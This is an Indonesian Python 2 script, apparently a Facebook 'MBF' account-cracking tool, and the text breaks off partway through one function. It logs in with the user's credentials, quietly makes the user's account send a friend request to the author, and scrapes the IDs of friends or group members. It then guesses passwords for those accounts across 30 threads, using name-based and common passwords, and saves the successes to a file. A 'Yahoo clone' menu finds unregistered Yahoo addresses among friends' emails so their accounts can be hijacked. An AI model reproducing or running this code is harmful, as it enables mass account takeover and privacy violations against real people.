import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\x1b[1;96m[!] \x1b[1;91mExit'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


logo = '\x1b[0;36m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[0;36m\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88      \x1b[1;91m\xe2\x97\x8f\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe0\xb9\x91\xdb\xa9\xdb\xa9\xe0\xb9\x91\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x97\x8f\n\x1b[0;36m\xe2\x96\x88\x1b[31;1m\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc \x1b[1;33m- _ --_--\x1b[1;95m\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80   \xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97 \n\x1b[0;36m\xe2\x96\x88 \x1b[1;33m \x1b[1;33m_-_-- -_ --__\x1b[1;93m \xe2\x95\x91\xe2\x95\x91\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97\n\x1b[0;36m\xe2\x96\x88\x1b[31;1m\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\x1b[1;33m--  - _ --\x1b[1;96m\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4   \xe2\x95\x9a  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \x1b[1;96mDark RMBL\n\x1b[0;36m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88      \x1b[31;1m\xc2\xab----------\xe2\x9c\xa7----------\xc2\xbb\n\x1b[0;36m \xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\n\x1b[1;93m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\n\x1b[1;93m\xe2\x95\x91\x1b[1;96m* \x1b[1;93mAuthor  \x1b[1;93m: \x1b[1;93mAgung Prasetyo\x1b[1;93m              \n\x1b[1;93m\xe2\x95\x91\x1b[1;96m* \x1b[1;93mGitHub  \x1b[1;93m: \x1b[1;93m\x1b[4mhttps://github.com/MrBSTRD13\x1b[0m \x1b[1;93m      \n\x1b[1;93m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;96m[\xe2\x97\x8f] \x1b[1;93mSedang masuk \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'

def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 42 * '\x1b[1;96m='
        print '\x1b[1;96m[\xe2\x98\x86] \x1b[1;93mLOGIN AKUN FACEBOOK ANDA \x1b[1;96m[\xe2\x98\x86]'
        id = raw_input('\x1b[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
        pwd = raw_input('\x1b[1;96m[+] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;96m[!] \x1b[1;91mTidak ada koneksi'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mLogin Berhasil'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;96m[!] \x1b[1;91mTidak ada koneksi'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;96m[!] \x1b[1;91mSepertinya akun anda kena checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;96m[!] \x1b[1;91mPassword/Email salah'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.text)
            nama = a['name']
            id = a['id']
        except KeyError:
            os.system('clear')
            print '\x1b[1;96m[!] \x1b[1;91mSepertinya akun anda kena checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;96m[!] \x1b[1;91mTidak ada koneksi'
            keluar()

    os.system('clear')
    print logo
    print 42 * '\x1b[1;96m='
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m]\x1b[1;93m Nama \x1b[1;91m: \x1b[1;92m' + nama + '\x1b[1;97m               '
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m]\x1b[1;93m ID   \x1b[1;91m: \x1b[1;92m' + id + '\x1b[1;97m              '
    print 42 * '\x1b[1;96m='
    print '\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Hack Fb MBF'
    print '\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Lihat daftar grup               '
    print '\x1b[1;96m[\x1b[1;92m4\x1b[1;96m]\x1b[1;93m Yahoo clone               '
    print '\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Keluar            '
    pilih()


def pilih():
    unikers = raw_input('\n\x1b[1;97m >>> \x1b[1;97m')
    if unikers == '':
        print '\x1b[1;96m[!] \x1b[1;91mIsi yang benar'
        pilih()
    elif unikers == '1':
        super()
    elif unikers == '2':
        grupsaya()
    elif unikers == '3':
        yahoo()
    elif unikers == '0':
        jalan('Menghapus token')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;96m[!] \x1b[1;91mIsi yang benar'
        pilih()


def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 42 * '\x1b[1;96m='
    print '\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Crack dari daftar teman'
    print '\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Crack dari teman'
    print '\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Crack dari member grup'
    print '\x1b[1;96m[\x1b[1;92m4\x1b[1;96m]\x1b[1;93m Crack dari file'
    print '\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Kembali'
    pilih_super()


def pilih_super():
    global cekpoint
    global oks
    peak = raw_input('\n\x1b[1;97m >>> \x1b[1;97m')
    if peak == '':
        print '\x1b[1;96m[!] \x1b[1;91mIsi yang benar'
        pilih_super()
    elif peak == '1':
        os.system('clear')
        print logo
        print 42 * '\x1b[1;96m='
        jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mMengambil ID \x1b[1;97m...')
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    elif peak == '2':
        os.system('clear')
        print logo
        print 42 * '\x1b[1;96m='
        idt = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan ID teman \x1b[1;91m: \x1b[1;97m')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;93mNama teman\x1b[1;91m :\x1b[1;97m ' + op['name']
        except KeyError:
            print '\x1b[1;96m[!] \x1b[1;91mTeman tidak ditemukan!'
            raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
            super()

        jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mMengambil ID \x1b[1;97m...')
        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

    elif peak == '3':
        os.system('clear')
        print logo
        print 42 * '\x1b[1;96m='
        idg = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan ID group \x1b[1;91m:\x1b[1;97m ')
        try:
            r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
            asw = json.loads(r.text)
            print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;93mNama group \x1b[1;91m:\x1b[1;97m ' + asw['name']
        except KeyError:
            print '\x1b[1;96m[!] \x1b[1;91mGroup tidak ditemukan'
            raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
            super()

        jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mMengambil ID \x1b[1;97m...')
        re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
        s = json.loads(re.text)
        for p in s['data']:
            id.append(p['id'])

    elif peak == '4':
        os.system('clear')
        print logo
        print 42 * '\x1b[1;96m='
        try:
            idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan nama file  \x1b[1;91m: \x1b[1;97m')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '\x1b[1;96m[!] \x1b[1;91mFile tidak ditemukan'
            raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
            super()

    elif peak == '0':
        menu()
    else:
        print '\x1b[1;96m[!] \x1b[1;91mIsi yang benar'
        pilih_super()
    print '\x1b[1;96m[+] \x1b[1;93mTotal ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mStart \x1b[1;97m...')
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;96m[\x1b[1;97m\xe2\x9c\xb8\x1b[1;96m] \x1b[1;93mCrack \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)

    print
    print '\x1b[1;96m[!] \x1b[1;93mStop CTRL+z'
    print 42 * '\x1b[1;96m='

    def main(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass
        else:
            try:
                a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                b = json.loads(a.text)
                pass1 = b['first_name'] + '123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
                    oks.append(user + pass1)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
                    cek = open('out/super_cp.txt', 'a')
                    cek.write(user + '|' + pass1 + '\n')
                    cek.close()
                    cekpoint.append(user + pass1)
                else:
                    pass2 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
                        oks.append(user + pass2)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
                        cek = open('out/super_cp.txt', 'a')
                        cek.write(user + '|' + pass2 + '\n')
                        cek.close()
                        cekpoint.append(user + pass2)
                    else:
                        pass3 = b['last_name'] + '123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
                            oks.append(user + pass3)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
                            cek = open('out/super_cp.txt', 'a')
                            cek.write(user + '|' + pass3 + '\n')
                            cek.close()
                            cekpoint.append(user + pass3)
                        else:
                            pass4 = 'Bangsat'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
                                oks.append(user + pass4)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
                                cek = open('out/super_cp.txt', 'a')
                                cek.write(user + '|' + pass4 + '\n')
                                cek.close()
                                cekpoint.append(user + pass4)
                            else:
                                pass5 = 'Sayang'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
                                    oks.append(user + pass5)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
                                    cek = open('out/super_cp.txt', 'a')
                                    cek.write(user + '|' + pass5 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass5)
                                else:
                                    pass6 = 'Kontol'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
                                        oks.append(user + pass6)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
                                        cek = open('out/super_cp.txt', 'a')
                                        cek.write(user + '|' + pass6 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass6)
                                    else:
                                        a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                                        b = json.loads(a.text)
                                        pass7 = 'Anjing'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
                                            oks.append(user + pass7)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
                                            cek = open('out/super_cp.txt', 'a')
                                            cek.write(user + '|' + pass7 + '\n')
                                            cek.close()
                                            cekpoint.append(user + pass7)
            except:
                pass

    p = ThreadPool(30)
    p.map(main, id)
    print 42 * '\x1b[1;96m='
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mSelesai \x1b[1;97m....'
    print '\x1b[1;96m[+] \x1b[1;92mTotal OK/\x1b[1;93mCP \x1b[1;91m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;96m[+] \x1b[1;92mCP File tersimpan \x1b[1;91m: \x1b[1;97mout/super_cp.txt'
    raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
    super()


def grupsaya():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('out')
        except OSError:
            pass

        os.system('clear')
        print logo
        print 42 * '\x1b[1;96m='
        try:
            uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
            gud = json.loads(uh.text)
            for p in gud['data']:
                nama = p['name']
                id = p['id']
                f = open('out/Grupid.txt', 'w')
                listgrup.append(id)
                f.write(id + '\n')
                print '\x1b[1;96m[\x1b[1;92mGroup\x1b[1;96m]\x1b[1;97m ' + str(id) + ' \x1b[1;96m=>\x1b[1;97m ' + str(nama)

            print 42 * '\x1b[1;96m='
            print '\x1b[1;96m[+] \x1b[1;92mTotal Group \x1b[1;91m:\x1b[1;97m %s' % len(listgrup)
            print '\x1b[1;96m[+] \x1b[1;92mTersimpan \x1b[1;91m: \x1b[1;97mout/Grupid.txt'
            f.close()
            raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
            menu()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;96m[!] \x1b[1;91mTerhenti'
            raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
            menu()
        except KeyError:
            os.remove('out/Grupid.txt')
            print '\x1b[1;96m[!] \x1b[1;91mGroup tidak ditemukan'
            raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
            menu()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;96m[\xe2\x9c\x96] \x1b[1;91mTidak ada koneksi'
            keluar()
        except IOError:
            print '\x1b[1;96m[!] \x1b[1;91mError'
            raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
            menu()


def yahoo():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 42 * '\x1b[1;96m='
    print '\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Clone dari daftar teman'
    print '\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Clone dari teman'
    print '\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Clone dari member group'
    print '\x1b[1;96m[\x1b[1;92m4\x1b[1;96m]\x1b[1;93m Clone dari file'
    print '\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Kembali'
    clone()


def clone():
    embuh = raw_input('\n\x1b[1;97m >>> ')
    if embuh == '':
        print '\x1b[1;96m[!] \x1b[1;91mIsi yang benar'
    elif embuh == '1':
        clone_dari_daftar_teman()
    elif embuh == '2':
        clone_dari_teman()
    elif embuh == '3':
        clone_dari_member_group()
    elif embuh == '4':
        clone_dari_file()
    elif embuh == '0':
        menu()
    else:
        print '\x1b[1;96m[!] \x1b[1;91mIsi yang benar'


def clone_dari_daftar_teman():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token Invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('out')
        except OSError:
            pass

    os.system('clear')
    print logo
    mpsh = []
    jml = 0
    print 42 * '\x1b[1;96m='
    jalan('\x1b[1;96m[\x1b[1;97m\xe2\x9c\xba\x1b[1;96m] \x1b[1;93mMengambil email \x1b[1;97m...')
    teman = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    save = open('out/MailVuln.txt', 'w')
    jalan('\x1b[1;96m[\x1b[1;97m\xe2\x9c\xba\x1b[1;96m] \x1b[1;93mStart \x1b[1;97m...')
    print '\x1b[1;96m[!] \x1b[1;93mStop CTRL+z'
    print 42 * '\x1b[1;96m='
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write('Nama: ' + nama + 'ID :' + id + 'Email: ' + mail + '\n')
                    print '\x1b[1;96m[\x1b[1;92mVULN\xe2\x9c\x93\x1b[1;96m] \x1b[1;92m' + mail + ' \x1b[1;96m=>\x1b[1;97m' + nama
                    berhasil.append(mail)
        except KeyError:
            pass

    print 42 * '\x1b[1;96m='
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mSelesai \x1b[1;97m....'
    print '\x1b[1;96m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;96m[+] \x1b[1;92mFile tersimpan \x1b[1;91m:\x1b[1;97m out/MailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
    menu()


def clone_dari_teman():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('out')
        except OSError:
            pass

        os.system('clear')
        print logo
        mpsh = []
        jml = 0
        print 42 * '\x1b[1;96m='
        idt = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan ID teman \x1b[1;91m: \x1b[1;97m')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;93mNama\x1b[1;91m :\x1b[1;97m ' + op['name']
        except KeyError:
            print '\x1b[1;96m[!] \x1b[1;91mTeman tidak ditemukan'
            raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
            menu()

    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mMengambil email \x1b[1;97m...')
    teman = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    save = open('out/TemanMailVuln.txt', 'w')
    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mStart \x1b[1;97m...')
    print '\x1b[1;96m[!] \x1b[1;93mStop CTRL+z'
    print 43 * '\x1b[1;96m='
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
